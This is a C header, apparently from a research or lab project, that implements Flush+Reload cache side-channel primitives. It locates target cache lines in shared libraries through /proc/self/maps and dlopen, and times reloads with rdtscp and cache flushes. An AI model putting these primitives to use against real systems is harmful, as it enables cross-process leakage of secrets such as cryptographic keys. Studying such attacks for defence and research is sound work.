#ifndef _FLUSH_RELOAD_H_
#define _FLUSH_RELOAD_H_

#include "global.h"
#include "utils.h"

MEM_ADDR locate_flush_reload_target(char * lib_name, unsigned int cidx_offset) {
    // return lib_base + (cidx_offset * CACHE_LINE_SIZE);

    int i;
    int verify = 0;
    MEM_ADDR addr_bgn, addr_end;
    MEM_ADDR ret_addr = 0;

    FILE * fp;
    char * line = NULL;
    size_t len = 0;
    ssize_t read;

    // Locate target lib file
    fp = fopen("/proc/self/maps", "r");
    if (fp == NULL) {
        fprintf(stderr, "Cannot read /proc/maps file!\n");
        exit(EXIT_FAILURE);
    }

    // while ((read = getline(&line, &len, fp)) != -1) {
    line = malloc(300 * sizeof(char));
    while (fgets(line, 300, fp) != NULL) {
        // printf("%s", line);
        if (strstr(line, lib_name) != 0) {
            // fprintf(stderr, "%s", line);
#ifdef ENVIRONMENT_32_BIT
            sscanf(line, "%lx-%lx", &addr_bgn, &addr_end);
#else
            sscanf(line, "%llx-%llx", &addr_bgn, &addr_end);
#endif
            ret_addr = addr_bgn + (cidx_offset * CACHE_LINE_SIZE);
            if (ret_addr > addr_end) {
                ret_addr = 0;
                continue;
            }
            break;
        }
    }
    fclose(fp);
    if (line)
        free(line);
    if (ret_addr != 0)
        return ret_addr + TARGET_ROP_OFFSET;
    else
        return 0;
}

static int readAddressFile(char * fn, MEM_ADDR * targetLib, MEM_ADDR * targetAddr) {
    int numAddrs = 0;
    char targetLibName[100];
    unsigned int targetCidxOffset;

    FILE * fp;
    char * line = NULL;
    size_t len = 0;
    ssize_t read;

    fp = fopen(fn, "r");
    if (fp == NULL)
        return -1;

    while ((read = getline(&line, &len, fp)) != -1) {
        sscanf(line, "%s 0x%x", targetLibName, &targetCidxOffset);
        targetLib[numAddrs] = dlopen(targetLibName, RTLD_NOW | RTLD_GLOBAL);
        targetAddr[numAddrs] = locate_flush_reload_target(targetLibName, targetCidxOffset);
        numAddrs ++;
    }

    fclose(fp);
    if (line)
        free(line);
    return numAddrs;
}

static uint64_t fnr_ts0, fnr_ts1;

static int FNR_THRESHOLD = 325;

#define RELOAD_TIME(TARGET, RET) { \
    RDTSCP(fnr_ts0); /*fnr_ts0 = rdtsc();*/ \
    LOAD(TARGET); \
    RDTSCP(fnr_ts1); /*fnr_ts1 = rdtsc();*/ \
    MFENCE(); \
    RET = fnr_ts1 - fnr_ts0; \
}

#ifndef FNR_YIELD
#define FNR_YIELD 4
#endif
static int fnr_yield_count;
#define FLUSH_RELOAD(TARGET, RET) { \
    fnr_ts0 = rdtsc_bgn(); \
    LOAD(TARGET); \
    fnr_ts1 = rdtsc_end(); \
    flush(TARGET); /*CFLUSH(TARGET);*/ \
    RET = fnr_ts1 - fnr_ts0; \
    for (fnr_yield_count = 0; fnr_yield_count < FNR_YIELD; fnr_yield_count++) { sched_yield();} \
}

#endif
